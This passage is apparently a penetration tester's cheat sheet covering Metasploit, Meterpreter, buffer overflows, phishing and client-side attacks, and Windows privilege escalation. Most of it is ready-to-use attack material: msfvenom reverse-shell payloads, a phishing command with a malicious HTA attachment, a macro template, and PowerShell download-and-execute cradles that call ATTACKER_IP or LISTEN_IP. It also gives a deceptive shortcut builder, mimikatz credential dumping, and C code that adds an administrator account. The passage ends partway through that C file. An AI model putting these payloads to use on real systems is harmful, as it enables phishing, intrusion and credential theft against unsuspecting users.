# add a workspace
msf6> workspace -a NAME
# change workspaces
msf6> workspace OTHERNAME
# delete workspace
msf6> workspace -d NAME


# working with modules:

# search for module containing specific keywords
msf6> search Apache 2.4.49
# restrict search to exploits
msf6> search type:exploit smb
# restrict search to auxiliary modules (scanners, brute-forcers, etc.)
msf6> search type:auxiliary smb
# view description, reliability, etc. info of a module
# if you want to view info on active module, omit arg
msf6> info [module-name-or-search-number]
# Choose a module to activate
msf6> use 56
# view arguments/options to set for active module
# at a minimum, RHOSTS is usually a required arg
msf6 auxiliary(scanner/smb/smb_version) > show options
# set value for option (option name not case-sensitive)
msf6 auxiliary(scanner/smb/smb_version) > set rhosts VICTIM_IP
# unset an option
msf6 auxiliary(scanner/smb/smb_version) > unset rhosts
# set RHOSTS based on discovered hosts/services in database
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
# set (global) option to persist accross all modules
msf6 auxiliary(scanner/smb/smb_version) > setg rhosts VICTIM_IP
# unset a global option
msf6 auxiliary(scanner/smb/smb_version) > unsetg rhosts
# show advanced options for the module
msf6 auxiliary(scanner/smb/smb_version) > show advanced
# execute the active module (once required options set)
msf6 auxiliary(scanner/smb/smb_version) > run

# when working with exploits

# show list of all compatible payloads for active exploit module
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
# chose payload to use (can use number from 'show payloads')
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload NUM_OR_NAME
# set payload options same way as exploit module options
# (you can specify an interface name, and it'll auto-pull your IP)
msf6 exploit(multi/http/apache_normalize_path_rce) > set lhost tun0


# using data stored in the database:

# run nmap scan and save results to msfdb workspace
msf6> db_nmap <nmap-options>
# list all discovered hosts in msfdb workspace
msf6> hosts
# NOTE: you an tag hosts and search by tags.
# see: https://docs.rapid7.com/metasploit/tagging-hosts-in-msfconsole
# list all discovered services
msf6> services
# list all discovered services for port 8000
msf6> services -p 8000
# check if metasploit automatically detected any vulnerabilities
msf6> vulns
# view any saved/discovered credentials from brute force scans
msf6> creds


# meterpreter sessions and routing tables:

# view list of sessions
msf6> sessions
# resume interaction on backgrounded session
msf6> sessions -i SESS_ID
# add route to metasploit's routing table for attacking internal targets
# this lets you do things like run port scans or throw exploits against
# internal hosts from inside metasploit
msf6> route add CIDR_INTERNAL_SUBNET SESSION_ID
# view existing msf routing table
msf6> route print
# clear all routes from table
msf6> route flush
```



### 3.4.2 Metasploit Resource Scripts

When starting `msfconsole` with the `-r` flag, you pass it a "resources" script (`.rc`) file that contains a series of instructions to run as soon as metasploit starts.

**NOTE:** There are lots of pre-made resource scripts located here:

```sh
ls -l /usr/share/metasploit-framework/scripts/resource
```

Here is an example file. The script looks exactly like a series of commands you'd type in the interactive console.

```sh
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set lhost LHOST
set lport 443
# cause the spawned Meterpreter to automatically launch a background notepad.exe
# process and migrate to it. Automating process migration helps to avoid 
# situations where our payload is killed prematurely either by defensive 
# mechanisms or the termination of the related process
set AutoRunScript post/windows/manage/migrate
# ensure that the listener keeps accepting new connections after a session is created
set ExitOnSession false
# run module as a job in the background and stop us from automatically interacting with the session
run -z -j
```


### 3.4.3 Meterpreter command basics

One payload option is to use the Meterpreter agent. It drops you into a command shell that lets you do all sorts of fun stuff easily (port forwarding, key-logging, screen grabbing, etc.).

```sh
# view list of meterpreter commands
meterpreter> help
# get information about victim system
meterpreter> sysinfo
# get username
meterpreter> getuid
# drop into interactive bash/cmd.exe shell
meterpreter> shell
# to suspend the shell to background, use Ctrl+z
# list backgrounded shells (called 'channels'):
meterpreter> channel -l
# interact with backgrounded channel (shell)
meterpreter> channel -i NUM
# download file from victim
meterpreter> download /etc/passwd
# upload file to victim
meterpreter> upload /usr/bin/unix-privesc-check /tmp/
# attempt to auto-privesc to SYSTEM (on Windows host)
meterpreter> getsystem
# migrate your process to the memory of another process
meterpreter> ps # find another process running with same user as you
meterpreter> migrate PID # move your process to the memory of another process
# spawn a process hidden ('-H') from user (no window)
meterpreter> execute -H -f iexplore.exe
# use mimikatz functionality to grab credentials
meterpreter> load kiwi
meterpreter> creds_all
# add local port forward rule via meterpreter
meterpreter> portfwd add -l LPORT -p RPORT -r RHOST
# send this meterpreter session to background (return to msf console)
meterpreter> bg
# shut down meterpreter agent
meterpreter> exit
```


### 3.4.4 Metasploit Modules and Payloads

Metasploit modules are located in:

```
/usr/share/metasploit-framework/modules/
```

These are the types/categories of Metasploit modules:

- **Exploit** - Exploits a vulnerability in a system/service, injecting your shellcode/command payload.
- **Auxiliary** - Does not execute a payload, but can be used to perform arbitrary actions that may not be directly related to exploitation. Examples of auxiliary modules include scanners, fuzzers, and denial of service attacks.
- **Post-Exploitation** - Enables you to gather more information or to gain further access to an exploited target system. E.g. hash dumps and service enumerators.
- **Payload** - A payload is the shell code that runs after an exploit successfully compromises a system. Defines what you want to do to the target system after you take control of it (e.g. Meterpreter, TCP reverse shell, run shell command).
- **NOP generator** - A NOP generator produces a series of random bytes that you can use to bypass standard IDS and IPS NOP sled signatures. Use NOP generators to pad buffers.

Metasploit **payloads** are either *single* (non-staged) or *staged*:
- *Single* payloads are entirely self-contained, fire-and-forget, and typically have a larger size, but they are more stable. They have extra **underscores** in their name (`linux/shell_reverse_tcp`).
- *Staged* payloads are basically a dropper that fetches and executes the rest after a callback. They are smaller in size, but can be less stable, and they require a metasploit handler to be listening to serve up the rest of the payload. They use extra **slashes** in their name (`linux/shell/reverse_tcp`).


## 3.5 Buffer Overflows

I wrote a great python script for tackling the old-school OSCP BOF boxes.
Check it out [here](tools/pwn-bof-template.py).

For quick-and dirty offset finding, sometimes you can try something like:

```sh
# using radare2's ragg2 utility for pattern generation:
ragg2 -rP 4096 | nc -nv $VICTIM_IP $PORT
# look up offset (note: must be hex value with '0x' at start!):
ragg2 -q 0x414a4141

# using msf's pattern_create.rb:
msf-pattern_create -l 1024 | nc -nv $VICTIM_IP $PORT
# look up offset (can be either hex value or string)
msf-pattern_offset -q 2Aa3
```

In Windows' Immunity Debugger, you can use [mona.py](https://github.com/corelan/mona) for building exploits.
Here are some useful commands:

```sh
# To make mona easier to work with, set a custom working folder:
!mona config -set workingfolder c:\mona

# find the offset of EIP register in your buffer:
!mona findmsp -distance <PATTERN_SIZE>
# equivalent to:
msf-pattern_offset -q EIP_VAL

# Check for bad bytes. First start with baseline pattern that uses all bytes
# except null:
!mona bytearray -b "\x00"
# Then compare your memory at ESP with the baseline:
!mona compare -f C:\mona\bytearray.bin -a <ESP_ADDR>
# Finally, add any found bad bytes to the list, repeating the exploit/check
# until you get "Unmodified" status after running the compare command.

# find 'jmp esp' gadget, excluding bad bytes in the pointer
!mona jmp -r esp -cpb '\x00\x51'
```



## 3.6 Client-Side Attacks

### 3.6.1 Phishing Emails

To send a phishing email with a malicious attachment, you can use the `swaks` tool:

```sh
# first, write a semi-convincing email body:
vim body.txt

# and create your malicious attachment
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0

# then send the email
swaks -t recipient1@example.com -t recipient2@example.com --from fakesender@example.com --attach @derp.hta --server SMTP_SERVER --body @body.txt --header "Subject: Clickbait" --suppress-data -ap
# it will prompt to input username and password if it's not an open SMTP server
```

Another option is to use the `sendemail` tool:

```sh
sendemail -f sender@example.com -t receiver@example.com -u "Subject text" -m "Message body text." -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]
```

A third option is to configure the Thunderbird email application to use the SMTP credentials to send your email via a GUI. When you're done, delete the profile from Thunderbird by opening the profile manager:

```sh
# open profile manager to delete old profiles
thunderbird -p
```


### 3.6.2 HTA Files

Windows Internet Explorer and Edge browsers support *HTML Applications* (`.hta` files) that can run arbitrary code using Windows scripting languages like VBScript encapsulated in HTML. Instead of being run in the security context of the browser (where access to system resources is limited), the browser automatically detects the `.hta` extension and executes it with the user's permissions via `mshta.exe` (after prompting the user if they want to run it).

Send one of these files to a user (or a link to one), and if they execute it, you win.

Here's the basic template (save as `derp.hta`):

```html
<html>
<head>
<script language="VBScript">

  <!-- just opens cmd terminal -->
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);

</script>
</head>
<body>
<script language="VBScript">
<!-- close this HTA window now that script running -->
self.close();
</script>
</body>
</html>
```

You can use msfvenom to generate an HTA file that will give you a reverse shell. You can either use the generated file directly or replace the top script block with a msfvenom payload:

```sh
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
```


### 3.6.3 Malicious Office Macros

You can exploit windows machines by sending a malicious Office file containing macros to the user. When they open the document, it'll execute your payload in your macro.

Here's the basic template of a malicious macro (replace the string "MALICIOUS COMMANDS HERE" with your payload):

```vb
Sub Document_Open()
    PWN
End Sub

Sub AutoOpen()
    PWN
End Sub

Sub PWN()
    Const DontWaitUntilFinished = False,  WaitUntilFinished = True
    Const ShowWindow = 1, DontShowWindow = 0
    Dim cmd as String
    cmd = cmd + "MALICIOUS COMMANDS HERE"
    set sh = CreateObject("WScript.Shell")
    sh.Run cmd, DontShowWindow
End Sub
```

Because VBA limits string literals to 255 characters, I wrote a two helper scripts that make it easier to insert a `powercat.ps1` reverse shell payload into the string.

- [mkpowercat.py](tools/win/mkpowercat.py)
- [vbsify.py](tools/win/vbsify.py)

Example Usage:

```sh
# create powercat macro payload
./mkpowercat.py | ./vbsify.py

# put powercat in current directory
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

# host file on http server
python3 -m http.server 80

# catching reverse shell callback:
nc -lvnp 443
```

Once you have your malicious VBA macro payload, insert it into the Office file of your choice (Word, Excel, PowerPoint, etc.), and send it to your victim in some way, like via an email attachment or file upload to a server.


### 3.6.4 Windows Library Files

You can use Windows Library files to mount a pseudo-filesystem pointing to an attacker-owned WebDAV server, which hosts malicious files you want the user to execute. The benefit of this technique is that antivirus doesn't seem to scan files on your WebDAV server like it does emailed office macros.

This technique uses a malicious `.lnk` file that starts a reverse shell when the user clicks on it.

First, start your WebDAV server:

```sh
# install wsgidav (WebDAV server)
pip3 install --user wsgidav

# make a folder that we want to host publicly
mkdir webdav

# start the server with open access
wsgidav --host=0.0.0.0 --port=8000 --auth=anonymous --root webdav/
# you can confirm this is running by going to http://127.0.0.1:8000 in your browser
```


To make a Windows Library file that points to our WebDAV server, we create an XML file with the `.Library-ms` extension. The file's basename is the "path" displayed to the user in their Explorer window. Make it blend in for client-side attacks.

Change the `<url>` field below, and save it as `Helpers.Library-ms` (or whatever):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <!-- version can be any number we choose -->
  <version>7</version>
  <!-- pin directory in Windows Explorer -->
  <isLibraryPinned>true</isLibraryPinned>
  <!-- imageres.dll pics from all Windows icons -->
  <!-- '-1003' is Pictures folder icon -->
  <!-- '-1002' is Documents folder icon -->
  <iconReference>imageres.dll,-1003</iconReference>
  <!-- templateInfo determines appearance and columns visible in Explorer window -->
  <templateInfo>
    <!-- Documents GUID -->
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <!-- searchConnector... specifies the storage location(s) the library points to -->
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <!-- use default behavior when user saving at this location, to blend in -->
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <!-- not documented in Microsoft Documentation webpage; used for compatibility -->
      <isSupported>false</isSupported>
      <!-- the location, our WebDAV URL -->
      <simpleLocation>
        <url>http://ATTACKER_IP:8000</url>  <!-- <===== CHANGE ME!!!!! -->
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

From here must create a malicious `.lnk` file that starts a reverse shell using a payload like the following as the link target:

```powershell
powershell -w hidden -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://LISTEN_IP/powercat.ps1');powercat -c LISTEN_IP -p 443 -e powershell"
```

If you want to base64 encode the above PowerShell payload, you may run into a character limit in the Windows shortcut GUI. It can only create a shortcut with 259 characters in the Target + Arguments fields, but you can use PowerShell to make more robust shortcuts, with longer payloads.

To generate the base64 payload, I recommend using my [`mkpowercat.py`](tools/mkpowercat.py) script.

```sh
# use my mkpowercat script
./mkpowercat.py

# manually convert to base64 (replace LISTEN_IP)
lhost=LISTEN_IP;echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost/powercat.ps1');powercat -c $lhost -p 443 -e powershell" | iconv -t UTF-16LE | base64 | tr -d '\n';echo
```

Insert base64 payload and run on windows to create malicious `.lnk` file:

```powershell
# make a custom malicious shortcut
$path                      = "$([Environment]::GetFolderPath('Desktop'))\automatic_configuration.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "%SystemRoot%\System32\imageres.dll,63" # app config icon

$shortcut.TargetPath       = "powershell.exe"
$shortcut.Arguments        = "-nop -ep bypass -w hidden -e BASE64PAYLOADHERE"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "" # can set to some hotkey combo like CTRL+C
$shortcut.Description      = "Nope, not malicious"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()
# source: https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
```

References:

- [Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)




# 4 Windows

## 4.1 Basic Windows Post-Exploit Enumeration

There are several key pieces of information we should always obtain:

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information (all interfaces, routes, and listening/active connections)
- Installed applications
- Running processes
```

Automate your enumeration with WinPEAS, etc.:

```sh
# WinPEAS for automated Windows enumeration
wget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

# PowerUp for Winodws privilege escalation
cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .

# PowerView for manual AD enumeration
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .

# SharpHound for automated AD enumeration
cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .

# sysinternals suite in case you need it
wget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals sysinternals.zip

# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens
cp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
wget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip -d mimikatz mimikatz.zip

# Rubeus.exe for AS-REP roasting, etc.
wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# chisel for port redirection/tunneling
echo 'DOWNLOAD chisel!'
echo 'https://github.com/jpillora/chisel/releases'

# plink.exe for port redirection/tunneling
cp /usr/share/windows-resources/binaries/plink.exe .

# nc.exe for reverse/bind shells and port redirection
cp /usr/share/windows-resources/binaries/nc.exe .

# JAWS - invoke with: powershell -exec Bypass -File .\jaws-enum.ps1
wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
# https://github.com/GhostPack/Seatbelt
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
# for older machines
wget https://github.com/carlospolop/winPE/raw/master/binaries/accesschk-xp/accesschk-2003-xp.exe



# host the files on a Windows 10+ compatible SMB share
impacket-smbserver -smb2support -user derp -password herpderp share .

# on windows host:
\\ATTACKER_IP\share\winpeas.exe
```

Commands to run:

```powershell
# Basic System Info
systeminfo
hostname

# Who am I?
whoami /all
echo %username%

# powershell way to check Integrity Level of another process
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel

# What users/localgroups are on the machine?
net user
net localgroup
powershell -c Get-LocalUser
powershell -c Get-LocalGroup
# Interesting built-in groups:
# Administrators - can do it all
# Remote Desktop Users - can use RDP
# Remote Management Users - can use WinRM
# Backup Operators - can backup and restore all files

# Who has local admin privileges?
net localgroup Administrators
powershell -c 'Get-LocalGroupMember Administrators'

# More info about a specific user. Check if user has privileges.
net user SOMEUSER

# Network Info
ipconfig /all
route print
netstat -ano
arp -a

# Firewall
netsh firewall show state
netsh firewall show config

# Installed Software
dir /b/a:d "C:\Program files" "C:\Program Files (x86)" | sort /unique
wmic product get name,version
powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
powershell -c "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | select displayname, DisplayVersion"
powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion"

# Processes
tasklist
powershell -c "get-process"
wmic process get processid,caption,executablepath,commandline,description

# Hard disks
fsutil fsinfo drives

# User environment
set

# How well patched is the system? (Hotfixes)
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Scheduled Tasks
schtasks
# more verbose list
schtasks /query /fo list /v

# Services running
# Get-CimInstance supercedes Get-WmiObject
Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\Windows\System32\*'} | select Name,PathName
# alternatively
wmic service where "started=true and not pathname like 'C:\\Windows\\System32\\%'" get name,pathname
# old school way
tasklist /svc
net start
sc queryex type= service state= active
# List all services
powershell -c "get-service"
sc queryex type= service state= all
# names only
sc queryex type= service state= all | find /i "SERVICE_NAME:"
# Stopped services
sc queryex type= service state= inactive
# Check a service's config settings (look for unquoted service path in BINARY_PATH_NAME)
sc qc SERVICENAME

# check powershell history
powershell -c Get-History

# locate PowerShell logfile (PSReadline)
powershell -c "(Get-PSReadlineOption).HistorySavePath"
# if you get a path, use type to view the file

# check if heavier PowerShell logging is enabled
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
# if so, view powershell command history with:
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | fl
# search powershell history for secrets:
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Select-String -Pattern "secret" # also try 'secur' and 'passw'

# User files that may have juicy data
powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*.pst,*.ost,*.eml,*.msg,*.log,id_* -File -Recurse -ErrorAction SilentlyContinue"
# alternative
dir /a-d /s/b C:\users | findstr /ilvC:\AppData\ /C:\desktop.ini /C:\ntuser.dat /C:"\All Users\VMware" /C:"\All Users\USOShared" /C:"\All Users\Package" /C:"\All Users\Microsoft"

# Check if plaintext creds stored by Wdigest (key exists, not set to 0)
# typically only common in Windows 7 and earlier
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

# LSA Protection enabled (key set to 1)?
reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL

# Credential Guard enabled (key set to 1 or 2)
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
# win11 automatic virtualization based security enabled:
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 /v IsolatedCredentialsRootSecret
# virualization based security enabled:
reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity
# secure boot enabled:
reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v RequirePlatformSecurityFeatures

# List saved credentials
cmdkey /list
# if found, might be able to pivot with:
# wmic /node:VICTIM_IP process call create "cmd /c powershell -nop -noni -exec bypass -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://ATTACKER_IP/rsh.ps1'))\""
# or steal creds with mimikatz

# Run executable with saved creds (assuming listed in cmdkey output)
runas /savecred /user:admin C:\Users\Public\revshell.exe

# check account policy (lockout threshold)
net accounts

# If both registry keys are set with DWORD values of 1, low-priv users can install *.msi files as NT AUTHORITY\SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# to pwn: msiexec /quiet /qn /i C:\Users\Public\revshell.msi

# Does it have AutoRuns with weak permissions?
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# is UAC enabled? EnableLUA = 0x1 means enabled.
# ConsentPromptBehaviorAdmin = 0x5 is default, requires UAC bypass with MS-signed binary using autoelevate
# Bad = ConsentPrompt == 2 && SecureDesktopPrompt == 1 (UAC is set to 'Always Notify')
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v PromptOnSecureDesktop

# Can you control the registry of services?
powershell -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"
# if NT AUTHORITY\INTERACTIVE has "FullContol", can pwn with:
# see section: Windows Service Escalation - Registry

# Can you put programs in the global startup folder?
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# look for (F), full access, or (W), write access
# exploit by dropping reverse shell exe there, wait for admin to log in.

# Do we have access to the SAM database? CVE-2021-36934, https://www.kb.cert.org/vuls/id/506989
icacls %windir%\system32\config\sam

# Vulnerable to Print NightMare (CVE-2021-1675, CVE-2021-34527)?
# Check running Print Spooler service using WMIC
wmic service list brief | findstr "Spool"
powershell Get-Service "Print Spooler"
# Check Registry to ensure NoWarningNoElevationOnInstall and UpdatePromptSettings
# either don't exist or are set to 0
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\UpdatePromptSettings"
powershell gci "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

# is WSL installed?
powershell -c "Get-ChildItem​ HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{​Get-ItemProperty​ ​$_​.PSPath} | ​out-string​ -width ​4096"

# Check the powershell version
powershell $PSVersionTable.PSVersion
powershell (Get-Host).Version
powershell $host.Version

# Determine .NET version on machine (useful for running C# exploits)
dir C:\windows\microsoft.net\framework\

# Drivers
driverquery
# Kernel Drivers (for exploit?)
driverquery | findstr Kernel
# Filesystem drivers
driverquery | findstr "File System"
```


### 4.1.1 Watching for Windows Process to run

Yo can use WMI (CIM in PowerShell) to watch for a process to be executed:

```powershell
# Watches for a process with a given name to start running (or otherwise change)
# reference: https://petri.com/process-monitoring-powershellGetOwner

$poll = 1
$targetName = "backup.exe" # name of process to watch for
$logPath= "C:\Users\yoshi\Desktop\NewProcessLog.txt" # where to log hits
$query = "Select * from CIM_InstModification within $poll where TargetInstance ISA 'Win32_Process' AND TargetInstance.Name LIKE '%$targetName%'"
$action={
    # log to a file
    $date = Get-Date
    $process = $Event.SourceEventArgs.NewEvent.SourceInstance
    $owner = Invoke-CimMethod -InputObject $process -MethodName GetOwner
    $logText = ""
    $logText += "[$date] Computername = $($process.CSName)`r`n"
    $logText += "[$date] Process = $($process.Name)`r`n"
    $logText += "[$date] Owner = $($owner.Domain)\$($owner.User)`r`n"
    $logText += "[$date] Command = $($process.Commandline)`r`n"
    $logText += "[$date] PID = $($process.ProcessID)`r`n"
    $logText += "[$date] PPID = $($process.ParentProcessID)`r`n"
    $logText += "[$date] $('*' * 60)`r`n"
    $logText | Out-File -FilePath $logPath -Append -Encoding ascii
}
Register-CimIndicationEvent -Query $query -SourceIdentifier "WatchProcess" -Action $action

# to Unsubscribe:
# Get-EventSubscriber -SourceIdentifier "WatchProcess" | Unregister-Event
```


## 4.2 Windows Privilege Escalation

So many options on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).

Automated checks using SharpUp.exe or PowerUp.ps1:

```powershell
# on kali get SharpUp and/or PowerUp, serve on http
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
impacket-smbserver -smb2support -user derp -password herpderp share .

# on victim
\\ATTACKER_IP\share\SharpUp.exe audit
# or
powershell -ep bypass
. \\ATTACKER_IP\share\PowerUp.ps1
Invoke-AllChecks

# PowerUp, individually:
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Find-ProcessDLLHijack
Find-PathDLLHijack
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
Get-UnattendedInstallFile
Get-WebConfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
```

**Background on Windows Permissions:**

Knowing how Windows identifies principals is necessary to understand access tokens. It's also critical for understanding how to move around in Active Directory.

A **Security Identifier (SID)** is how Windows identifies entities such as users or groups, formally called *principals*, that that can be authenticated. Local SIDs are generated by the _Local Security Authority (LSA)_. Domain SIDs are generated by the _Domain Controller (DC)_.

The SID format is `S-R-X-Y`:
- *S*: SIDs always start with the literal "S".
- *R*: *revision*; it is always set to 1 (SIDS still currently on 1st revision).
- *X*: identifier authority (who issued the SID); "5" is most common, representing "NT Authority", used for both local and domain users/groups.
- *Y*: sub-authorities of identifier authority. This part consists of both the domain identifier and the *Relative Identifier (RID)*. The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID is like a unique index/ID for a user/group within that domain ID. It's almost like a `uid` or `gid` in Unix.

SIDs with RIDs under 1000 are well-known SIDs, identifying built-in users/groups. Here are some useful ones to know:

```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

SIDs starting with 1000 and incrementing up are local users/groups.

Once a user is authenticated, Windows generates an *access token* that is assigned to that user. The token itself contains various pieces of information that effectively describe the _security context_ of a given user. The security context is a set of rules or attributes that are currently in effect, including the user's SID, the SIDs of the user's groups, etc.

When a user starts a process or thread, a copy of the user's access token will be assigned to these objects. This token, called a _primary token_, specifies which permissions the process or threads have when interacting with another object. A thread can also have an _impersonation token_ assigned, which is used to provide a different security context than the process that owns the thread, allowing the thread to act on behalf of a different set of access rights.

Windows also implements what is known as *Mandatory Integrity Control*. It uses _integrity levels_ to control access to securable objects. A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so. When processes are started or objects are created, they receive the integrity level of the principal performing this operation.

From Windows Vista onward, processes run on four integrity levels:

```
- System: SYSTEM (kernel, ...)
- High: Elevated users (Administrators)
- Medium: Standard users
- Low: very restricted rights often used in sandboxed processes or for directories storing temporary data
```

How to see integrity levels:
- Processes: Process Explorer (Sysinternals)
- Current User: `whoami /groups`
- Files: `icacls`

_User Account Control (UAC)_ is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or _filtered admin token_), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a UAC consent prompt normally needs to be confirmed.


### 4.2.1 Check Windows File Permissions

Weak permissions can provide a privesc vector.

```powershell
# Using accesschk from SysInternals Suite
# checking file write permissions
accesschk.exe /accepteula -quvw c:\path\to\some\file.exe

# checking registry key permissions
accesschk.exe /accepteula -quvwk c:\path\to\some\file.exe

# checking service configuration change permissions
accesschk.exe /accepteula -quvwc SERVICENAME
# if you have SERVICE_CHANGE_CONFIG permissions, exploit by changing binpath
# e.g. sc config SERVICENAME binpath= "net localgroup administrators user /add"
```



### 4.2.2 Windows Service Escalation - Registry

Vulnerable when:

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# shows NT AUTHORITY\INTERACTIVE has FullControl
```

`windows_service.c`:
```c
// compile with:
// x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

//add the payload here
int Run()
{
    system ("net user derp herpderp /add");
    system ("net localgroup administrators derp /add");
    return 0;
}

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "Derp";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv)
{
    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
